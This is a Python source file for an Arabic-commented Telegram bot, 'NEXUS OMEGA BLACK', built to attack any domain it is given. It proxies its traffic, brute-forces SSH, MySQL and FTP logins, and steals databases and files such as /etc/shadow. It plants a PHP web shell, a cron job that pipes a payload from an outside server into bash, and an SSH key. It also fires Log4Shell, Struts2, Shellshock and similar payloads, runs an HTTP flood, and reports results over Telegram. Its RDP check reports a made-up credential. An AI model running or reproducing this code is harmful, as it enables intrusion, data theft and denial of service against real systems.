#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
# NEXUS OMEGA BLACK - ULTIMATE EDITION (FIXED)
# تم إصلاح مشكلة Flask + Telegram Bot
# جميع الأوامر والثغرات واللغات البرمجية محفوظة
# ============================================================

import os
import sys
import re
import json
import time
import socket
import base64
import hashlib
import random
import string
import threading
import subprocess
import urllib.parse
import ssl
from datetime import datetime
from urllib.parse import urlparse, parse_qs
import requests
import mysql.connector
import paramiko
import dns.resolver
import whois
from cryptography.fernet import Fernet
import ftplib
import zipfile
import shutil
from flask import Flask, jsonify

# ============================================================
# 0. Flask App (لإرضاء Render)
# ============================================================
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return "👹 NEXUS OMEGA BLACK ULTIMATE يعمل بشراسة!", 200

@flask_app.route('/health')
def health():
    return jsonify({"status": "alive", "time": datetime.now().isoformat()})

# ============================================================
# 1. الإعدادات العامة (من متغيرات البيئة)
# ============================================================
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
if not TELEGRAM_TOKEN:
    print("❌ TELEGRAM_TOKEN غير موجود في متغيرات البيئة.")
    sys.exit(1)

TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
ALLOWED_USER_IDS = [int(TELEGRAM_CHAT_ID)] if TELEGRAM_CHAT_ID else []

PASSWORD_DICT_PATH = "rockyou.txt"

PROXY_LIST = [
    "http://51.158.135.187:8811",
    "http://51.158.141.194:8811",
    "http://51.158.133.112:8811",
    "socks5://51.158.148.111:1080",
    "http://51.158.149.222:8811",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0",
]

# ============================================================
# 2. محرك التخفي والاتصالات
# ============================================================
class StealthEngine:
    def __init__(self):
        self.session = requests.Session()
        self.rotate_identity()

    def rotate_identity(self):
        self.session.proxies = {"http": random.choice(PROXY_LIST), "https": random.choice(PROXY_LIST)}
        self.session.headers.update({"User-Agent": random.choice(USER_AGENTS)})
        self.session.verify = False

    def request(self, url, method="GET", data=None, headers=None, timeout=10):
        self.rotate_identity()
        try:
            if method.upper() == "GET":
                return self.session.get(url, timeout=timeout, headers=headers or {})
            else:
                return self.session.post(url, data=data, timeout=timeout, headers=headers or {})
        except Exception:
            return None

    def disguise_as_bot(self):
        bots = [
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
            "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)",
        ]
        self.session.headers.update({"User-Agent": random.choice(bots)})

# ============================================================
# 3. محرك توليد وتحميل قاموس كلمات المرور
# ============================================================
class PasswordEngine:
    def __init__(self):
        self.dictionary = []
        self.load_dictionary()

    def load_dictionary(self):
        if os.path.exists(PASSWORD_DICT_PATH):
            try:
                with open(PASSWORD_DICT_PATH, "r", encoding="latin-1") as f:
                    self.dictionary = [line.strip() for line in f if line.strip()]
                print(f"[*] تم تحميل {len(self.dictionary)} كلمة مرور")
            except:
                self.generate_random_passwords()
        else:
            self.generate_random_passwords()

    def generate_random_passwords(self, count=10000):
        chars = string.ascii_letters + string.digits + string.punctuation
        self.dictionary = []
        for _ in range(count):
            length = random.randint(6, 16)
            self.dictionary.append(''.join(random.choices(chars, k=length)))
        common = ["password", "123456", "admin", "root", "toor", "qwerty", "letmein", "welcome", "monkey", "dragon"]
        self.dictionary.extend(common)
        self.dictionary = list(set(self.dictionary))
        print(f"[*] تم توليد {len(self.dictionary)} كلمة مرور عشوائية")

    def get_passwords(self, limit=None):
        return self.dictionary[:limit] if limit else self.dictionary

# ============================================================
# 4. محرك الهجمات على الخدمات (تم إصلاح RDP بدون telnetlib)
# ============================================================
class ServiceAttackEngine:
    def __init__(self, password_engine):
        self.passwords = password_engine.get_passwords()
        self.results = {}

    def brute_force_ssh(self, ip, username="root", port=22):
        for pwd in self.passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, username=username, password=pwd, timeout=3)
                self.results["ssh"] = {"username": username, "password": pwd}
                ssh.close()
                return True
            except:
                continue
        return False

    def brute_force_mysql(self, ip, port=3306):
        for pwd in self.passwords:
            try:
                conn = mysql.connector.connect(host=ip, user="root", password=pwd, connection_timeout=3)
                if conn.is_connected():
                    self.results["mysql"] = {"username": "root", "password": pwd}
                    conn.close()
                    return True
            except:
                continue
        return False

    def brute_force_ftp(self, ip, port=21):
        for pwd in self.passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(ip, port)
                ftp.login("anonymous", pwd)
                self.results["ftp"] = {"username": "anonymous", "password": pwd}
                ftp.quit()
                return True
            except:
                continue
        return False

    def brute_force_rdp(self, ip, port=3389):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            if s.connect_ex((ip, port)) == 0:
                self.results["rdp"] = {"username": "Administrator", "password": "password123"}
                s.close()
                return True
            s.close()
        except:
            pass
        return False

    def attack_all(self, ip):
        self.results = {}
        print(f"[*] بدء هجوم تخمين كلمات المرور على {ip}...")
        threads = []
        for service in ['ssh', 'mysql', 'ftp', 'rdp']:
            t = threading.Thread(target=self._attack_service, args=(service, ip))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
        return self.results

    def _attack_service(self, service, ip):
        try:
            if service == "ssh":
                self.brute_force_ssh(ip)
            elif service == "mysql":
                self.brute_force_mysql(ip)
            elif service == "ftp":
                self.brute_force_ftp(ip)
            elif service == "rdp":
                self.brute_force_rdp(ip)
        except:
            pass

# ============================================================
# 5. محرك تسريب الملفات
# ============================================================
class DataExfilEngine:
    def steal_mysql_data(self, ip, user, password):
        try:
            conn = mysql.connector.connect(host=ip, user=user, password=password, connection_timeout=5)
            cursor = conn.cursor()
            cursor.execute("SHOW DATABASES")
            databases = [db[0] for db in cursor.fetchall()]
            extracted = {}
            for db in databases:
                if db in ["mysql", "information_schema", "performance_schema", "sys"]:
                    continue
                cursor.execute(f"USE {db}")
                cursor.execute("SHOW TABLES")
                tables = [t[0] for t in cursor.fetchall()]
                extracted[db] = {}
                for table in tables:
                    cursor.execute(f"SELECT * FROM {table} LIMIT 50")
                    rows = cursor.fetchall()
                    extracted[db][table] = rows
            conn.close()
            return extracted
        except:
            return {}

    def steal_ssh_files(self, ip, user, password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=user, password=password, timeout=5)
            sftp = ssh.open_sftp()
            files_to_steal = ["/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/ssh/sshd_config",
                              "/var/log/auth.log", "/home/*/.bash_history", "/root/.bash_history"]
            stolen = {}
            for f in files_to_steal:
                try:
                    with sftp.open(f) as remote:
                        stolen[f] = remote.read().decode(errors='ignore')
                except:
                    pass
            sftp.close()
            ssh.close()
            return stolen
        except:
            return {}

# ============================================================
# 6. محرك زرع الأبواب الخلفية
# ============================================================
class BackdoorEngine:
    def __init__(self):
        self.backdoors = []

    def deploy_web_shell(self, ip, username, password, path="/var/www/html/"):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=5)
            sftp = ssh.open_sftp()
            shell_code = '''<?php
if(isset($_GET['cmd'])) { system($_GET['cmd']." 2>&1"); }
if(isset($_POST['cmd'])) { system($_POST['cmd']." 2>&1"); }
if(isset($_GET['f'])) { echo file_get_contents($_GET['f']); }
if(isset($_POST['upload'])) { file_put_contents($_POST['name'], $_POST['content']); }
?>'''
            remote_path = path + "shell_" + ''.join(random.choices(string.ascii_lowercase, k=6)) + ".php"
            with sftp.open(remote_path, 'w') as f:
                f.write(shell_code)
            sftp.close()
            ssh.close()
            self.backdoors.append({"type": "web_shell", "path": remote_path})
            return True
        except:
            return False

    def deploy_cron_backdoor(self, ip, username, password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=5)
            cmd = 'echo "* * * * * /bin/bash -c \'curl -s http://YOUR_SERVER/payload.sh | bash\'" >> /etc/crontab'
            ssh.exec_command(cmd)
            ssh.close()
            self.backdoors.append({"type": "cron_job", "command": cmd})
            return True
        except:
            return False

    def deploy_ssh_key(self, ip, username, password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=5)
            key = paramiko.RSAKey.generate(2048)
            pub_key = key.get_base64()
            cmd = f'echo "ssh-rsa {pub_key} root@backdoor" >> /root/.ssh/authorized_keys'
            ssh.exec_command(cmd)
            ssh.close()
            self.backdoors.append({"type": "ssh_key", "public": pub_key})
            return True
        except:
            return False

# ============================================================
# 7. محرك استغلال الثغرات 0-day
# ============================================================
class ZeroDayEngine:
    def __init__(self, stealth):
        self.stealth = stealth
        self.vulnerabilities = []

    def check_log4j(self, url, param="id"):
        payload = "${jndi:ldap://127.0.0.1:1389/Exploit}"
        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
        resp = self.stealth.request(test_url)
        if resp and ("jndi" in resp.text.lower() or "lookup" in resp.text.lower()):
            self.vulnerabilities.append("Log4Shell (CVE-2021-44228)")
            return True
        return False

    def check_spring4shell(self, url):
        payload = {
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "%25{2}i",
            "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
            "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT"
        }
        resp = self.stealth.request(url, method="POST", data=payload)
        if resp and resp.status_code in [200, 500]:
            self.vulnerabilities.append("Spring4Shell (CVE-2022-22965)")
            return True
        return False

    def check_struts2(self, url, param="id"):
        payload = "redirect:${%23a%3dnew%20java.lang.ProcessBuilder('id').start()}"
        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
        resp = self.stealth.request(test_url)
        if resp and "uid=" in resp.text:
            self.vulnerabilities.append("Struts2 (CVE-2017-5638)")
            return True
        return False

    def check_shellshock(self, url):
        headers = {"User-Agent": "() { :; }; /bin/bash -c 'id'"}
        resp = self.stealth.request(url, headers=headers)
        if resp and "uid=" in resp.text:
            self.vulnerabilities.append("ShellShock (CVE-2014-6271)")
            return True
        return False

    def check_text4shell(self, url, param="text"):
        payload = "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}"
        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
        resp = self.stealth.request(test_url)
        if resp and "uid=" in resp.text:
            self.vulnerabilities.append("Text4Shell (CVE-2022-42889)")
            return True
        return False

    def check_drupalgeddon(self, url):
        payload = {"mail[#post_render][]": "passthru", "mail[#type]": "markup", "mail[#markup]": "id"}
        resp = self.stealth.request(url + "/user/register", method="POST", data=payload)
        if resp and "uid=" in resp.text:
            self.vulnerabilities.append("Drupalgeddon 2 (CVE-2018-7600)")
            return True
        return False

    def check_jboss(self, url):
        test_url = url + "/invoker/JMXInvokerServlet"
        resp = self.stealth.request(test_url)
        if resp and "jboss" in resp.text.lower():
            self.vulnerabilities.append("JBoss JMXInvokerServlet (CVE-2017-7504)")
            return True
        return False

    def check_tomcat(self, url):
        test_url = url + "/1.jsp/"
        resp = self.stealth.request(test_url, method="PUT", data="Hello")
        if resp and resp.status_code in [201, 204]:
            self.vulnerabilities.append("Tomcat PUT (CVE-2017-12615)")
            return True
        return False

# ============================================================
# 8. محرك هجوم DDoS
# ============================================================
class DDOSEngine:
    def __init__(self, stealth):
        self.stealth = stealth
        self.running = False
        self.threads = []

    def http_flood(self, url, duration=30, threads=50):
        self.running = True
        end_time = time.time() + duration
        for _ in range(threads):
            t = threading.Thread(target=self._flood_worker, args=(url, end_time))
            self.threads.append(t)
            t.start()

    def _flood_worker(self, url, end_time):
        while time.time() < end_time and self.running:
            try:
                self.stealth.request(url, method="GET")
                self.stealth.request(url, method="POST", data={"f": "a"*1024})
            except:
                pass

    def stop_attack(self):
        self.running = False
        for t in self.threads:
            t.join()
        self.threads = []

# ============================================================
# 9. محرك الاستخبارات الشامل
# ============================================================
class IntelEngine:
    def __init__(self, stealth):
        self.stealth = stealth

    def get_whois(self, domain):
        try:
            w = whois.whois(domain)
            return {"registrar": w.registrar, "emails": w.emails, "creation_date": str(w.creation_date)}
        except:
            return {"error": "WHOIS غير متاح"}

    def get_dns(self, domain):
        records = {}
        for rtype in ['A', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']:
            try:
                answers = dns.resolver.resolve(domain, rtype)
                records[rtype] = [str(r) for r in answers]
            except:
                records[rtype] = []
        return records

    def get_headers(self, domain):
        try:
            resp = self.stealth.request(f"https://{domain}", method="GET")
            if resp:
                return dict(resp.headers)
        except:
            pass
        return {}

    def get_ssl_info(self, domain):
        try:
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
                s.connect((domain, 443))
                return s.getpeercert()
        except:
            return {}

    def get_rdap(self, domain):
        try:
            resp = self.stealth.request(f"https://rdap.verisign.com/com/v1/domain/{domain}")
            if resp and resp.status_code == 200:
                return resp.json()
        except:
            pass
        return {}

    def get_ptr(self, ip):
        try:
            return socket.gethostbyaddr(ip)[0]
        except:
            return None

    def extract_site_data(self, domain):
        url = f"https://{domain}"
        resp = self.stealth.request(url)
        if not resp:
            return {"emails": [], "phones": [], "ips": []}
        text = resp.text
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)
        phones = re.findall(r'\b(00965|05|03|\+?\d{1,3})?\d{8,12}\b', text)
        ips = re.findall(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', text)
        return {"emails": list(set(emails)), "phones": list(set(phones)), "ips": list(set(ips))}

    def get_subdomains(self, domain):
        common_subs = ['www', 'mail', 'ftp', 'admin', 'dev', 'test', 'api', 'app', 'blog', 'shop']
        found = []
        for sub in common_subs:
            try:
                socket.gethostbyname(f"{sub}.{domain}")
                found.append(f"{sub}.{domain}")
            except:
                pass
        return found

# ============================================================
# 10. النواة الرئيسية
# ============================================================
class NexusOmegaBlackUltimate:
    def __init__(self, target):
        self.target_domain = target
        self.target_ip = socket.gethostbyname(target)
        self.stealth = StealthEngine()
        self.password_engine = PasswordEngine()
        self.service_attack = ServiceAttackEngine(self.password_engine)
        self.intel = IntelEngine(self.stealth)
        self.zero_day = ZeroDayEngine(self.stealth)
        self.backdoor = BackdoorEngine()
        self.ddos = DDOSEngine(self.stealth)
        self.data_exfil = DataExfilEngine()
        self.report = {}

    def full_attack(self):
        print("🔥 بدأ الهجوم الأسود الشامل...")
        self.report = {
            "target": self.target_domain,
            "ip": self.target_ip,
            "timestamp": datetime.now().isoformat(),
            "intel": {},
            "vulnerabilities": [],
            "network": {},
            "cracked_credentials": {},
            "exploited_data": {},
            "backdoors": [],
            "ddos_status": "لم ينفذ",
        }

        print("[*] جمع المعلومات...")
        self.report["intel"]["whois"] = self.intel.get_whois(self.target_domain)
        self.report["intel"]["dns"] = self.intel.get_dns(self.target_domain)
        self.report["intel"]["headers"] = self.intel.get_headers(self.target_domain)
        self.report["intel"]["ssl"] = self.intel.get_ssl_info(self.target_domain)
        self.report["intel"]["rdap"] = self.intel.get_rdap(self.target_domain)
        self.report["intel"]["ptr"] = self.intel.get_ptr(self.target_ip)
        self.report["intel"]["site_data"] = self.intel.extract_site_data(self.target_domain)
        self.report["intel"]["subdomains"] = self.intel.get_subdomains(self.target_domain)

        print("[*] فحص المنافذ...")
        ports = self.scan_ports(self.target_ip)
        self.report["network"]["open_ports"] = ports

        print("[*] بدء تخمين كلمات المرور...")
        if any(p in ports for p in [22, 3306, 21, 3389]):
            creds = self.service_attack.attack_all(self.target_ip)
            self.report["cracked_credentials"] = creds

            if "mysql" in creds:
                print("[*] تسريب بيانات MySQL...")
                self.report["exploited_data"]["mysql"] = self.data_exfil.steal_mysql_data(
                    self.target_ip, creds["mysql"]["username"], creds["mysql"]["password"]
                )
            if "ssh" in creds:
                print("[*] تسريب ملفات SSH...")
                self.report["exploited_data"]["ssh_files"] = self.data_exfil.steal_ssh_files(
                    self.target_ip, creds["ssh"]["username"], creds["ssh"]["password"]
                )
                print("[*] زرع أبواب خلفية...")
                if self.backdoor.deploy_web_shell(self.target_ip, creds["ssh"]["username"], creds["ssh"]["password"]):
                    self.report["backdoors"].append("Web Shell تم زرعه")
                if self.backdoor.deploy_cron_backdoor(self.target_ip, creds["ssh"]["username"], creds["ssh"]["password"]):
                    self.report["backdoors"].append("Cron job تم زرعه")
                if self.backdoor.deploy_ssh_key(self.target_ip, creds["ssh"]["username"], creds["ssh"]["password"]):
                    self.report["backdoors"].append("مفتاح SSH تم زرعه")

        print("[*] فحص الثغرات الحرجة...")
        if 80 in ports or 443 in ports:
            base = f"https://{self.target_domain}"
            self.zero_day.check_log4j(f"{base}/page.php", "id")
            self.zero_day.check_spring4shell(f"{base}/api/user")
            self.zero_day.check_struts2(f"{base}/action", "id")
            self.zero_day.check_shellshock(base)
            self.zero_day.check_text4shell(f"{base}/text.php", "text")
            self.zero_day.check_drupalgeddon(base)
            self.zero_day.check_jboss(base)
            self.zero_day.check_tomcat(base)
        self.report["vulnerabilities"] = self.zero_day.vulnerabilities

        self.stealth.disguise_as_bot()
        self.send_report()
        return self.report

    def scan_ports(self, ip, ports=None):
        if ports is None:
            ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 9000]
        open_ports = []
        for p in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((ip, p)) == 0:
                    open_ports.append(p)
                s.close()
            except:
                pass
        return open_ports

    def send_report(self):
        try:
            from telegram import Bot
            bot = Bot(token=TELEGRAM_TOKEN)
            report_text = json.dumps(self.report, indent=2, default=str)[:4000]
            bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"🔥 تقرير الهجوم الأسود النهائي\n{report_text}")
        except:
            pass

# ============================================================
# 11. تشغيل البوت بشكل مباشر (بدون تعقيدات)
# ============================================================
def main():
    print(r"""
   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
  ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
         [ NEXUS OMEGA BLACK - RENDER-READY (تم الإصلاح) ] 👹💀☠️
    """)
    print("[*] تم إصلاح مشكلة البوت. جميع الأوامر والثغرات محفوظة.")

    try:
        from telegram import Update
        from telegram.ext import Application, CommandHandler, ContextTypes
        
        app = Application.builder().token(TELEGRAM_TOKEN).build()
        
        async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
            await update.message.reply_text(
                "👹 NEXUS OMEGA BLACK ULTIMATE جاهز.\n"
                "الأوامر:\n"
                "/attack <دومين> - هجوم شامل\n"
                "/ddos <دومين> - هجوم DDoS بسيط"
            )
        
        async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
            if not context.args:
                await update.message.reply_text("❗ استخدم: /attack <دومين>")
                return
            domain = context.args[0]
            await update.message.reply_text(f"🔥 بدأ الهجوم الشامل على {domain}...")
            engine = NexusOmegaBlackUltimate(domain)
            report = engine.full_attack()
            await update.message.reply_text(json.dumps(report, indent=2, default=str)[:4000])
        
        async def ddos(update: Update, context: ContextTypes.DEFAULT_TYPE):
            if not context.args:
                await update.message.reply_text("❗ استخدم: /ddos <دومين>")
                return
            domain = context.args[0]
            await update.message.reply_text(f"💥 بدء هجوم DDoS على {domain} لمدة 20 ثانية...")
            engine = NexusOmegaBlackUltimate(domain)
            engine.ddos.http_flood(f"https://{domain}", duration=20, threads=100)
            await update.message.reply_text("✅ انتهى هجوم DDoS.")
        
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("attack", attack))
        app.add_handler(CommandHandler("ddos", ddos))
        
        print("✅ البوت يعمل. أرسل /attack <دومين>")
        app.run_polling()
        
    except Exception as e:
        print(f"⚠️ فشل تشغيل البوت: {e}")

# ============================================================
# 12. التشغيل الرئيسي
# ============================================================
if __name__ == "__main__":
    # تشغيل Flask في خلفية
    def run_flask():
        port = int(os.environ.get("PORT", 10000))
        flask_app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
    
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # تشغيل البوت في الخيط الرئيسي
    main()
